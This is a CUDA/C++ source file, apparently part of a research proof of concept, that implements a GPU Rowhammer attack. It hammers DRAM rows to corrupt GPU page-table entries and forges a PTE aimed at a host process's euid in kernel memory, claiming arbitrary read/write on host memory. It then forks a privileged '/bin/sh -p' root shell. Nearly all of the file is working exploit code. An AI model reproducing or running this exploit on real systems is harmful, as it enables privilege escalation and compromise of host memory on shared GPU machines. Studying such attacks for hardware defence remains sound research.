#include "./s2_firstRegion.cuh"
#include "./s3_firstRegion_hammer.cuh"
#include <algorithm>
#include <chrono>
#include <cmath>
#include <fstream>
#include <numeric>
#include <random>
#include <rh_impls.cuh>
#include <rh_kernels.cuh>
#include <rh_utils.cuh>
#include <string>
#include <thread>

#include <cinttypes>
#include <cstdint>
#include <cstdio>
#include <iomanip>
#include <iostream>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <cerrno>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <sys/wait.h>
#include <unistd.h>

void *get_euid_address()
{
    char command[256];

    int length = std::snprintf(
        command,
        sizeof(command),
        "echo %ld | "
        "sudo -n tee /sys/kernel/cred_helper/pid >/dev/null && "
        "cat /sys/kernel/cred_helper/euid_addr",
        static_cast<long>(getpid())
    );

    if (length < 0 || static_cast<std::size_t>(length) >= sizeof(command)) {
        errno = EOVERFLOW;
        return nullptr;
    }

    FILE *pipe = popen(command, "r");
    if (pipe == nullptr) {
        return nullptr;
    }

    char output[256];

    if (std::fgets(output, sizeof(output), pipe) == nullptr) {
        pclose(pipe);
        errno = EIO;
        return nullptr;
    }

    int status = pclose(pipe);

    if (status == -1 ||
        !WIFEXITED(status) ||
        WEXITSTATUS(status) != 0) {
        errno = EIO;
        return nullptr;
    }

    errno = 0;
    char *end = nullptr;

    unsigned long long value = std::strtoull(output, &end, 0);

    if (errno != 0 || end == output || value > UINTPTR_MAX) {
        errno = EINVAL;
        return nullptr;
    }

    return reinterpret_cast<void *>(
        static_cast<std::uintptr_t>(value)
    );
}

bool
first_PT_region_attack (uint64_t num_alloc_init, double threshold,
                        uint64_t skip, GPUBreachContext &ctx)
{
  uint8_t *temp;
  if (!first_PT_region (num_alloc_init, threshold, skip, ctx))
    {
      printf ("Error: First PT Region Allocation is wrong\n");
      exit (1);
    }

  auto &agg_vec = ctx.step2_data.agg_vec;
  auto &agg_row_list = ctx.step2_data.agg_row_list;
  ctx.step3_data.agg_ptrs = ctx.step2_data.agg_ptrs;

  DBG_OUT << std::dec;
  DBG_OUT
      << "Start Step 3" << "\n"
      << "EUID Information:"
      << "\n\n";

  uint64_t repeats = 0;

  auto &region_ptrs = ctx.step3_data.region_ptrs;
  auto &corrupted_ptr = ctx.step3_data.corrupted_ptr;
  auto &victim_ptr = ctx.step3_data.victim_ptr;
  auto &corrupted_id = ctx.step3_data.corrupted_id;
  auto &victim_id = ctx.step3_data.victim_id;

  region_ptrs = std::vector<uint8_t *> (num_alloc_init, nullptr);

  /* Why -100: We don't want eviction to happen when we hammer so we take a
   * slight underestimate */
  uint64_t conservative_alloc = num_alloc_init - 100;

  /**
   * WARNING: this code is aggresively making 64KB pages,
   * this will require a non-negligible amount of CPU RAM.
   *
   * To conserve RAM usage, you may even try filling first using 2MB + 4KB or
   * cuMemMap.
   */

  /****************************************************************/
  /* Step 3 of Paper: Repeat Hammer On PTEs til Corruption */
  /****************************************************************/
  auto *euid_address =
      static_cast<unsigned long *>(get_euid_address());

  if (euid_address == nullptr) {
      perror("get_euid_address");
      return 1;
  }

  constexpr std::uintptr_t PAGE_SIZE_2MB = 2ULL * 1024 * 1024;
  constexpr std::uintptr_t OFFSET_MASK = PAGE_SIZE_2MB - 1;

  std::uintptr_t address =
        reinterpret_cast<std::uintptr_t>(euid_address);

  std::uintptr_t aligned_address =
        address & ~OFFSET_MASK;

  std::uintptr_t offset =
      address & OFFSET_MASK;

  std::uintptr_t fn  = aligned_address >> 16;
  std::uintptr_t val = fn << 12;
  val |= UINT64_C(0x0600000000000007);
  DBG_OUT << "Original address:  0x" << std::hex << address << std::dec
            << std::endl;
  DBG_OUT << "2MB-aligned base:  0x" << std::hex << aligned_address
            << std::dec << std::endl;
  DBG_OUT << "Offset within page: 0x" << std::hex << offset << std::dec
            << std::endl;
  DBG_OUT << "val: 0x" << std::hex << std::setw(16) << std::setfill('0')
            << val << std::setfill(' ') << std::dec << std::endl;

  constexpr std::size_t kNumPtrs = 512;
  auto& first_region_memmap_ptrs = ctx.step2_data.first_region_memmap_ptrs;
  uint8_t** d_last_memmap_ptrs = nullptr;
  cudaMalloc(&d_last_memmap_ptrs,
            kNumPtrs * 8);
  cudaMemcpy(
      d_last_memmap_ptrs,
      first_region_memmap_ptrs.data() + 
          (first_region_memmap_ptrs.size() - kNumPtrs),
      kNumPtrs * 8,
      cudaMemcpyHostToDevice);


  bool found_mismatch = false;
  while (!found_mismatch)
    {
      // On Failure, Re-order and try again
      std::cout << "\nHammer Starts..." << '\n';

      // Flush TLB of all the cuMemMapped pointers.
      uint8_t* temp_flush;
      cudaMallocManaged(&temp_flush, 4L * GB);
      gen_64KB(temp_flush, 4L * GB);
      const uint64_t it = ctx.bitflip_config.it;
      const uint64_t n = ctx.bitflip_config.n;
      const uint64_t k = ctx.bitflip_config.k;
      const uint64_t delay = ctx.bitflip_config.delay;
      const uint64_t period = ctx.bitflip_config.period;
      const uint64_t repeat = ctx.bitflip_config.repeat;

      // GPUHammer
       for (int j = 0; j < repeat; j++)
        uint64_t time = warp_simple_hammer_kernel_Ntrefi (
            agg_row_list, agg_vec, it, n, k, agg_vec.size () / 2, delay, period, 6);

      std::cout
          << "Hammer Done, Looking for DUEs"
          << '\n';

      /**
       * Look through all pages for the its own address in its data (see
       * `initialize_memory` also) A mismatch indicates a 64KB page has been
       * remapped.
       */
      
      gpuErrchk (cudaPeekAtLastError ());

      flush_tlb(temp_flush, 4L * GB);
      // Given a PTE is 16B and ECC is 32 byte, iterating one by one can cause your kernel to crash but the next PTE is the corrupted one
      // If your exploitable flip resides in the first, no change, if second, change i = 0 to i = 1.
      uint64_t i = 0;
      for (; !found_mismatch && i < 128 * KB; i+=2)
        {
          // Exploit will start if observe a misdirection
          check_region_inner<<<1, kNumPtrs>>> ((uint8_t*)first_region_memmap_ptrs[i], d_last_memmap_ptrs, (uint8_t*)val, (uint64_t)offset);
          check_region_inner<<<1, kNumPtrs>>> ((uint8_t*)first_region_memmap_ptrs[i + 1], d_last_memmap_ptrs, (uint8_t*)val, (uint64_t)offset);
          cudaDeviceSynchronize ();
          DBG_OUT << "Checking PTE: " << i << "\n"; 
          cudaError_t err = cudaPeekAtLastError ();
          if (err != cudaSuccess)
          {
            std::cout << "Found DUE and performed the arbitrary RW on host memory."
                      << "\nAttempting to launch a Root shell." << "\n"; 
            break;
          }
        }
      if (i == 128 * KB)
        {
          std::cout << "No DUE Found..." << "\n\n";
          exit(1);
        }

      // When reached, the attack failed either because the error is not DUE or
      // the DUE didn't happen in this PTE bit format try a new PTE instead. Will need to automate this
      // std::cout << "No Corruption Found, Exiting...." << "\n\n";
      pid_t pid = fork();
            if (pid == -1)
            {
                perror("fork");
            }
            else if (pid == 0)
            {
                // Child
                std::cout << "In child process (PID: " << getpid() << ")" << std::endl;

                uid_t euid = geteuid();

                std::cout << "Effective UID: " << euid << std::endl;
                std::cout << "Type some commands... " << std::endl;
                execl("/bin/sh", "sh", "-p", (char *)NULL);
                // If execl returns, it failed:
                perror("execl");
                _exit(1); // use _exit in child to avoid flushing parent's stdio buffers
            }
            else
            {
                // Parent: wait for the specific child to finish
                int status = 0;
                pid_t w;
                do
                {
                    w = waitpid(pid, &status, 0); // block until child exits
                } while (w == -1 && errno == EINTR); // retry if interrupted by a signal

                if (w == -1)
                {
                    perror("waitpid");
                }
                else
                {
                    if (WIFEXITED(status))
                    {
                        std::cout << "Child " << pid << " exited with status " << WEXITSTATUS(status) << std::endl;
                    }
                    else if (WIFSIGNALED(status))
                    {
                        std::cout << "Child " << pid << " killed by signal " << WTERMSIG(status) << std::endl;
                    }
                    else
                    {
                        std::cout << "Child " << pid << " ended with status 0x" << std::hex << status << std::dec
                                  << std::endl;
                    }
                }
            }

      exit(1);

      if (found_mismatch)
        {
          std::cout << "\nAfter " << repeats << " repeats" << '\n';
          std::cout << "Corrupted: " << (void *)corrupted_ptr
                    << ". Victim: " << (void *)victim_ptr << '\n';
          break;
        }
      else
        std::cout << "No Corruption Found, Retrying..." << "\n\n";

      if (debug_enabled ())
        paused ();
    }

  /* Find the victim address that we remapped to in our `region_ptrs` */
  uint8_t *victim_round_addr
      = (uint8_t *)((uintptr_t)victim_ptr & ~((1UL << 20) - 1));
  for (uint64_t i = 0; i < conservative_alloc; i += 1)
    {
      if (region_ptrs[i] == victim_round_addr)
        {
          victim_id = i;
          DBG_OUT << "Found victim id." << '\n';
        }
    }

  /* Allocate memory to full to prepare for massaging the second PT region. */
  /* Same concept as what "all_mem_test" did */
  int consec_spike = 0;
  int consec_spike_lim = 3;
  DBG_OUT << "Filling Memory back to full\n";
  for (uint64_t i = conservative_alloc; i < num_alloc_init; i++)
    {
      cudaMallocManaged (&temp, ALLOC_SIZE);
      double currentMS = time_data_access (temp, ALLOC_SIZE);
      region_ptrs[i] = temp;

      // Look for consecutive spikes, reset if not.
      consec_spike += currentMS > threshold ? 1 : -consec_spike;
      if (consec_spike == consec_spike_lim)
        {
          break;
        }
    }
  if (debug_enabled ())
    {
      std::cout << "(Step 3 Done) Found Corrupted PFN Destination: Press "
                   "\033[1;32mEnter Key\033[0m to continue..."
                << '\n';
      paused ();
    }
  else
    {
      std::cout << "(Step 3 Done) Found Corrupted PFN Destination\n";
    }

  return true;
}

bool
first_PT_region_attack (int argc, char *argv[])
{
  const uint64_t num_alloc_init = std::stoll (argv[0]);
  const double threshold = std::stod (argv[1]);
  const uint64_t skip = std::stoull (argv[2]);
  GPUBreachContext ctx;
  ctx.bitflip_config = GPUBreachContext::BitFlipConfig (argv[3]);
  return first_PT_region_attack (num_alloc_init, threshold, skip, ctx);
}
